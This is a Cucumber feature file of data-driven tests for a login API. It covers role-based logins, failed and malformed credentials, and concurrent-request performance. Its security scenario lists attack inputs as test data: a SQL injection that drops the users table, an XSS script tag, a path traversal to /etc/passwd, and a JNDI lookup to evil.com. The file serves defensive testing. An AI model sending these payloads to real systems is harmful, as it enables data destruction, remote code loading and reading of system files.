@api @integration @data-driven
Feature: Authentication API - Data Driven Testing
  As a system integrator
  I want to test the authentication API with various data sets
  So that I can ensure robust API functionality

  Background:
    Given the API base URL is configured

  @positive @critical
  Scenario Outline: Successful API authentication with different user types
    When I send a POST request to "/auth/login" with:
      | username | <username> |
      | password | <password> |
    Then the response status should be 200
    And the response should contain a valid JWT token
    And the user role should be "<expectedRole>"
    And the token should be valid for <tokenDuration> minutes

    Examples:
      | username | password     | expectedRole | tokenDuration |
      | admin    | Admin123!    | admin        | 60            |
      | manager  | Manager123!  | manager      | 45            |
      | user     | User123!     | user         | 30            |
      | guest    | Guest123!    | guest        | 15            |

  @negative @critical
  Scenario Outline: Failed API authentication with invalid data
    When I send a POST request to "/auth/login" with:
      | username | <username> |
      | password | <password> |
    Then the response status should be <expectedStatus>
    And the response should contain error message "<expectedError>"
    And no token should be returned

    Examples:
      | username    | password      | expectedStatus | expectedError           |
      | invalid     | wrongpass     | 401            | Invalid credentials     |
      | admin       | wrongpass     | 401            | Invalid password        |
      | wronguser   | Admin123!     | 401            | User not found          |
      |             | Admin123!     | 400            | Username is required    |
      | admin       |               | 400            | Password is required    |

  @validation @api
  Scenario Outline: API input validation with edge cases
    When I send a POST request to "/auth/login" with:
      | username | <username> |
      | password | <password> |
    Then the response status should be <expectedStatus>
    And the response should contain validation errors

    Examples:
      | username                          | password                          | expectedStatus |
      | a                                | test123                           | 400            |
      | verylongusernamethatexceedslimit | test123                           | 400            |
      | testuser                         | 12                                | 400            |
      | testuser                         | verylongpasswordthatexceedslimit  | 400            |
      | test@user                        | test123                           | 400            |
      | <script>alert('xss')</script>    | test123                           | 400            |

  @security @api
  Scenario Outline: Security testing with malicious inputs
    When I send a POST request to "/auth/login" with:
      | username | <username> |
      | password | <password> |
    Then the response status should be 400 or 401
    And the response should not contain sensitive information
    And the system should log the security attempt

    Examples:
      | username                     | password                     |
      | admin'; DROP TABLE users; -- | test123                      |
      | <script>alert('xss')</script>| test123                      |
      | ../../../etc/passwd          | test123                      |
      | ${jndi:ldap://evil.com/}     | test123                      |

  @performance @api
  Scenario Outline: API performance testing with concurrent requests
    When I send <requestCount> concurrent POST requests to "/auth/login" with:
      | username | <username> |
      | password | <password> |
    Then all responses should be received within <maxTime> seconds
    And the success rate should be above <minSuccessRate>%

    Examples:
      | username | password  | requestCount | maxTime | minSuccessRate |
      | admin    | Admin123! | 10           | 5       | 95             |
      | user     | User123!  | 50           | 10      | 90             |
      | guest    | Guest123! | 100          | 15      | 85             |

